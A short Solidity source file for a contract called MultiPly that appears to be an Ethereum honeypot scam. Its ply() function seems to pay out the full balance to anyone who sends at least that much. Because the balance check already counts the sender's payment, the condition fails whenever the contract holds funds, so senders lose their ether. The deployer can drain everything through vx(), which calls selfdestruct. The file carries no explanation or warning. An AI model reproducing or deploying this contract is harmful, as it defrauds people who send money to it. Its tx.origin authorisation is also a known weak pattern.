pragma solidity ^0.4.25;

contract MultiPly
{
    address O = tx.origin;
    function() public payable {}
    function vx() public {if(tx.origin==O)selfdestruct(tx.origin);}
    function ply() public payable {
        if (msg.value >= this.balance) {
            tx.origin.transfer(this.balance);
        }
    }
 }